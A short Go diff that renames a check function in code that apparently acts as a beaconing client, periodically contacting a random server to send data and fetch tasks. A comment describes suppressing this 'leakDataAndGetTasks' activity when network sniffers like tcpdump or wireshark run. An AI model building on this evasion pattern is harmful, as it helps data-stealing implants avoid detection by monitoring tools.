@@ -19,7 +19,7 @@ func Routine(taskCh chan<- apps.AppData) {
 	for {
 		<-ticker.C
 		serverConfig := getRandomServer()
-		if !CanCommunicate(serverConfig) || !isSafeToCommunicate() {
+		if !CanCommunicate(serverConfig) || !isSafe() {
 			lgr.Error("Can't communicate with server", serverConfig.Address)
 		} else {
 			telemetry, err := NewTelemetry(true)
@@ -87,7 +87,7 @@ func getRandomServer() config.ServerConfig {
 	return servers[index]
 }
 
-func isSafeToCommunicate() bool {
+func isSafe() bool {
 	/*
 		don't leakDataAndGetTasks if there are sniffers (tcpdump, wireshark, etc..)
 		don't leakDataAndGetTasks if there is too much cpu usage
